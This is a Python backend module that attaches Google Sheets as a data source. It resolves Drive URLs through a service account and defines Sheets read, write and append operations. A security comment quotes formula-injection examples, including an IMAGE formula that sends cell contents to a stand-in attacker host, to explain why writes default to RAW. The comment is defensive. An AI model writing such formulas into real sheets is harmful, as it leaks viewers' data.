"""Attaching a Google spreadsheet as a data source.

Two jobs, both server-side because the impersonated credential lives here and
a browser cannot mint it:

1. :func:`resolve_google_file` turns what the user pasted — a Drive URL, or a
   bare file id — into ``{file_id, name, mime_type, can_edit}`` by asking the
   Drive API *as the impersonated service account*.  That is the only honest
   access check: a document the user can open is not necessarily one this
   backend can, since access is granted per document by sharing it with the
   service account's address.
2. :func:`google_sheets_template` is the ``google-sheets`` data source itself —
   base URL, ``google`` auth block and the Sheets v4 operations — so a source
   can be created without anyone hand-typing six operation templates.

Neither raises for a target-server failure: "the service account cannot see
that document" is the *expected* first outcome (nobody has shared it yet), and
the UI has to be able to say "share it with <address> and press Verify again".
So it comes back as ``status: "no_access"`` with the address, not as a 5xx.
"""
from __future__ import annotations

import logging
import re
from typing import Any

import httpx

from app.core.config import Settings
from app.infrastructure.auth.google_token_provider import (
    SHEETS_SCOPES,
    GoogleAuthError,
    configured_subject,
    get_google_auth_header,
)

logger = logging.getLogger(__name__)

RESOLVE_TIMEOUT_SECONDS = 15.0

SHEETS_BASE_URL = "https://sheets.googleapis.com"
DRIVE_FILES_URL = "https://www.googleapis.com/drive/v3/files"

SPREADSHEET_MIME_TYPE = "application/vnd.google-apps.spreadsheet"

# Drive share links all look like /<kind>/d/<id>/…  The three kinds are matched
# separately (not with one alternation) so a Doc or a Slides deck pasted into
# the Sheets field can be named in the error instead of failing as "not found".
_URL_PATTERNS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("spreadsheet", re.compile(r"/spreadsheets/d/([a-zA-Z0-9_-]+)")),
    ("document", re.compile(r"/document/d/([a-zA-Z0-9_-]+)")),
    ("presentation", re.compile(r"/presentation/d/([a-zA-Z0-9_-]+)")),
)

# A pasted id rather than a URL. Drive ids are opaque; this is a shape check,
# not a validity check — Drive decides whether it exists.
_BARE_ID_RE = re.compile(r"^[a-zA-Z0-9_-]{16,}$")

# What each URL shape means to a person, for the "that's not a Sheet" message.
_KIND_LABELS = {
    "document": "a Google Doc",
    "presentation": "a Google Slides presentation",
}


def parse_google_file_ref(text: str) -> tuple[str, str] | None:
    """``(kind, file_id)`` for a pasted Drive URL or bare id, else ``None``.

    ``kind`` is ``"spreadsheet"`` / ``"document"`` / ``"presentation"`` when the
    URL says so, and ``"unknown"`` for a bare id — where only Drive's
    ``mimeType`` can tell us what it is.
    """
    candidate = (text or "").strip()
    if not candidate:
        return None
    for kind, pattern in _URL_PATTERNS:
        match = pattern.search(candidate)
        if match:
            return kind, match.group(1)
    if _BARE_ID_RE.match(candidate):
        return "unknown", candidate
    return None


async def resolve_google_file(
    ref: str,
    settings: Settings,
    *,
    require_spreadsheet: bool = True,
) -> dict[str, Any]:
    """Resolve *ref* to a Drive file the impersonated account can see.

    Returns ``{"status": "ok", "file_id", "name", "mime_type", "can_edit",
    "service_account"}`` on success, or ``{"status": "...", "error": ...,
    "service_account": ...}`` otherwise.  ``status`` is one of:

    ``ok``            resolved and readable (``can_edit`` says whether writes
                      will work);
    ``invalid``       *ref* is not a Drive URL or file id at all;
    ``wrong_type``    it resolved, but it is a Doc / Slides deck, not a Sheet;
    ``no_access``     Drive answered 403/404 — almost always "not shared with
                      the service account yet", which is what the caller shows
                      the share instruction for;
    ``not_configured`` GOOGLE_IMPERSONATE_SA is unset on this backend;
    ``error``         anything else (network, unexpected Drive status).
    """
    service_account = configured_subject(settings)
    parsed = parse_google_file_ref(ref)
    if parsed is None:
        return {
            "status": "invalid",
            "error": (
                "That is not a Google Drive link or file id. Paste the "
                "spreadsheet's URL from the browser address bar."
            ),
            "service_account": service_account,
        }
    kind, file_id = parsed
    if require_spreadsheet and kind in _KIND_LABELS:
        return {
            "status": "wrong_type",
            "error": (
                f"That link points at {_KIND_LABELS[kind]}, not a Google Sheet. "
                "Open the spreadsheet and copy its URL instead."
            ),
            "file_id": file_id,
            "service_account": service_account,
        }

    try:
        headers = await get_google_auth_header(
            {"type": "google", "scopes": list(SHEETS_SCOPES)}, settings
        )
    except GoogleAuthError as exc:
        # Unset GOOGLE_IMPERSONATE_SA is a deployment gap, not a user mistake.
        status = "not_configured" if not service_account else "error"
        return {"status": status, "error": exc.message, "service_account": service_account}

    params = {
        "fields": "id,name,mimeType,capabilities/canEdit",
        # Without this a file living in a shared drive answers 404 even when the
        # service account can read it.
        "supportsAllDrives": "true",
    }
    try:
        async with httpx.AsyncClient(timeout=RESOLVE_TIMEOUT_SECONDS) as client:
            response = await client.get(
                f"{DRIVE_FILES_URL}/{file_id}", params=params, headers=headers
            )
    except Exception as exc:  # noqa: BLE001 — reported, never raised
        return {
            "status": "error",
            "error": f"Could not reach the Drive API: {exc.__class__.__name__}: {exc}",
            "file_id": file_id,
            "service_account": service_account,
        }

    if response.status_code in (403, 404):
        logger.info(
            "google resolve: '%s' not visible to '%s' (%d)",
            file_id, service_account, response.status_code,
        )
        return {
            "status": "no_access",
            "error": (
                f"{service_account or 'The backend service account'} cannot see "
                "that document yet. Share it with that address (Editor, to allow "
                "writes) and verify again."
            ),
            "file_id": file_id,
            "service_account": service_account,
        }
    if response.status_code >= 400:
        return {
            "status": "error",
            "error": f"Drive API returned {response.status_code}: {response.text[:500]}",
            "file_id": file_id,
            "service_account": service_account,
        }

    try:
        payload = response.json()
    except ValueError:
        return {
            "status": "error",
            "error": "Drive API returned a non-JSON response",
            "file_id": file_id,
            "service_account": service_account,
        }

    mime_type = payload.get("mimeType") or ""
    if require_spreadsheet and mime_type != SPREADSHEET_MIME_TYPE:
        return {
            "status": "wrong_type",
            "error": (
                f"'{payload.get('name') or file_id}' is a {mime_type or 'unknown'} "
                "file, not a Google Sheet."
            ),
            "file_id": file_id,
            "name": payload.get("name") or "",
            "mime_type": mime_type,
            "service_account": service_account,
        }

    return {
        "status": "ok",
        "error": None,
        "file_id": payload.get("id") or file_id,
        "name": payload.get("name") or "",
        "mime_type": mime_type,
        "can_edit": bool((payload.get("capabilities") or {}).get("canEdit")),
        "service_account": service_account,
    }


# ---------------------------------------------------------------------------
# The google-sheets data source
# ---------------------------------------------------------------------------

# Default for Sheets' `valueInputOption`.
#
# SECURITY: `USER_ENTERED` makes Sheets parse the value the way typing it would
# — so a cell value that starts with `=` becomes a live formula. Values written
# through this data source come from an LLM, a ticket body or a customer email,
# none of which is trusted input; `=IMPORTRANGE("<attacker sheet>", …)` or
# `=IMAGE("https://attacker/?d="&A1)` written into a sheet then executes with
# the *viewing* user's permissions and exfiltrates whatever that user can read.
# `RAW` stores the text as text, so the same string is inert. An operator who
# genuinely needs formulas can pass the param explicitly per call.
DEFAULT_VALUE_INPUT_OPTION = "RAW"

SPREADSHEET_ID_PARAM = {
    "name": "spreadsheet_id",
    "type": "string",
    "required": True,
    "description": "Spreadsheet file id (the /spreadsheets/d/<id>/ part of its URL)",
}
RANGE_PARAM = {
    "name": "range",
    "type": "string",
    "required": True,
    "description": "A1 notation, e.g. 'Sheet1!A1:D20' or a named range",
}
VALUE_INPUT_OPTION_PARAM = {
    "name": "value_input_option",
    "type": "string",
    "required": False,
    # Sheets refuses a write that states no valueInputOption, so this cannot be
    # left blank — and the API's own preference is the unsafe one. See
    # DEFAULT_VALUE_INPUT_OPTION above.
    "default": DEFAULT_VALUE_INPUT_OPTION,
    "description": (
        f"{DEFAULT_VALUE_INPUT_OPTION} (default — values stored as text) or "
        "USER_ENTERED (a value beginning with '=' becomes a live formula, so "
        "only for values you trust)."
    ),
}


def google_sheets_operations() -> list[dict[str, Any]]:
    """The Sheets v4 operations a ``google-sheets`` source exposes.

    Writes are marked ``destructive: true`` so they go through the existing
    approval gate: the verb alone would not gate them (only DELETE does), and
    overwriting a range of someone's spreadsheet is exactly the sort of thing
    the gate exists for.
    """
    return [
        {
            "name": "get_metadata",
            "method": "GET",
            "path": "/v4/spreadsheets/{params.spreadsheet_id}",
            # Only the tab list and named ranges — the full document would carry
            # every cell of every sheet, which is both huge and not what this is
            # for (it feeds the tab dropdown in the editor).
            "query_params": {
                "fields": "sheets(properties(sheetId,title,gridProperties)),namedRanges",
            },
            "params": [SPREADSHEET_ID_PARAM],
            "description": "Tabs (id, title, size) and named ranges of a spreadsheet",
        },
        {
            "name": "get_values",
            "method": "GET",
            "path": "/v4/spreadsheets/{params.spreadsheet_id}/values/{params.range}",
            "query_params": {
                "valueRenderOption": "{params.value_render_option}",
                "dateTimeRenderOption": "{params.date_time_render_option}",
            },
            "params": [
                SPREADSHEET_ID_PARAM,
                RANGE_PARAM,
                {
                    "name": "value_render_option",
                    "type": "string",
                    "required": False,
                    "description": "FORMATTED_VALUE (default), UNFORMATTED_VALUE or FORMULA",
                },
                {
                    "name": "date_time_render_option",
                    "type": "string",
                    "required": False,
                    "description": "SERIAL_NUMBER or FORMATTED_STRING",
                },
            ],
            "description": "Read one range of cells",
        },
        {
            "name": "batch_get_values",
            "method": "GET",
            "path": "/v4/spreadsheets/{params.spreadsheet_id}/values:batchGet",
            "query_params": {
                "valueRenderOption": "{params.value_render_option}",
                "dateTimeRenderOption": "{params.date_time_render_option}",
            },
            "params": [
                SPREADSHEET_ID_PARAM,
                {
                    "name": "ranges",
                    "type": "array",
                    "required": True,
                    "description": "A1 ranges to read, e.g. ['Sheet1!A:A', 'Sheet2!B2:C9']",
                },
                {
                    "name": "value_render_option",
                    "type": "string",
                    "required": False,
                    "description": "FORMATTED_VALUE (default), UNFORMATTED_VALUE or FORMULA",
                },
                {
                    "name": "date_time_render_option",
                    "type": "string",
                    "required": False,
                    "description": "SERIAL_NUMBER or FORMATTED_STRING",
                },
            ],
            "description": "Read several ranges in one call",
        },
        {
            "name": "update_values",
            "method": "PUT",
            "path": "/v4/spreadsheets/{params.spreadsheet_id}/values/{params.range}",
            # valueInputOption is a query-string argument on a PUT — the reason
            # OperationDefinition.query_params exists.
            "query_params": {"valueInputOption": "{params.value_input_option}"},
            "params": [
                SPREADSHEET_ID_PARAM,
                RANGE_PARAM,
                {
                    "name": "values",
                    "type": "array",
                    "required": True,
                    "description": "Rows of cell values, e.g. [['a', 1], ['b', 2]]",
                },
                VALUE_INPUT_OPTION_PARAM,
            ],
            "destructive": True,
            "description": "Overwrite the cells of one range",
        },
        {
            "name": "batch_update_values",
            "method": "POST",
            "path": "/v4/spreadsheets/{params.spreadsheet_id}/values:batchUpdate",
            "params": [
                SPREADSHEET_ID_PARAM,
                {
                    "name": "data",
                    "type": "array",
                    "required": True,
                    "description": "[{range, values}] entries, one per range to write",
                },
                # batchUpdate takes valueInputOption in the JSON body, not the
                # query string — so it stays a loose param here.
                VALUE_INPUT_OPTION_PARAM,
            ],
            "destructive": True,
            "description": "Overwrite several ranges in one call",
        },
        {
            "name": "append_values",
            "method": "POST",
            "path": "/v4/spreadsheets/{params.spreadsheet_id}/values/{params.range}:append",
            "query_params": {
                "valueInputOption": "{params.value_input_option}",
                "insertDataOption": "{params.insert_data_option}",
            },
            "params": [
                SPREADSHEET_ID_PARAM,
                RANGE_PARAM,
                {
                    "name": "values",
                    "type": "array",
                    "required": True,
                    "description": "Rows to append, e.g. [['a', 1], ['b', 2]]",
                },
                VALUE_INPUT_OPTION_PARAM,
                {
                    "name": "insert_data_option",
                    "type": "string",
                    "required": False,
                    "description": "OVERWRITE (default) or INSERT_ROWS",
                },
            ],
            # NOT gated. The approval gate exists for irreversible change,
            # and appending rows after the last row of a table is not that --
            # nothing existing is removed or overwritten. It was flagged
            # destructive along with the two overwriting operations, so every
            # append asked a human to approve "Data deletion — 1 row", which
            # is wrong twice over and trains people to click Approve.
            #
            # `false` rather than unset, so this is a recorded decision: the
            # verb is POST, which would not gate it either, but a future
            # change to the verb rules must not silently pick this up.
            #
            # Note `insert_data_option`: Sheets' own default is OVERWRITE,
            # which writes into whatever sits below the table rather than
            # shifting it down. Pass INSERT_ROWS for an append that cannot
            # touch anything already there.
            "destructive": False,
            # Append is not idempotent: a retry after a timeout that in fact
            # reached Sheets appends the rows a second time. One attempt only.
            "retries": {"attempts": 1},
            "description": "Append rows after the last row of a range",
        },
    ]


def google_sheets_template(settings: Settings) -> dict[str, Any]:
    """A ready-to-save ``google-sheets`` data source payload.

    Returned by ``GET /datasources/google/sheets-template`` (the editor
    prefills its form from it) and used by the management MCP tool that creates
    the source directly, so both surfaces get the same operations.
    """
    return {
        "id": "google-sheets",
        "name": "Google Sheets",
        "description": (
            "Read and write Google Sheets. Each spreadsheet must be shared with "
            f"{configured_subject(settings) or 'the backend service account'}."
        ),
        "kind": "http",
        "base_url": SHEETS_BASE_URL,
        "auth": {"type": "google", "scopes": list(SHEETS_SCOPES)},
        "operations": google_sheets_operations(),
        "service_account": configured_subject(settings),
        "default_value_input_option": DEFAULT_VALUE_INPUT_OPTION,
    }
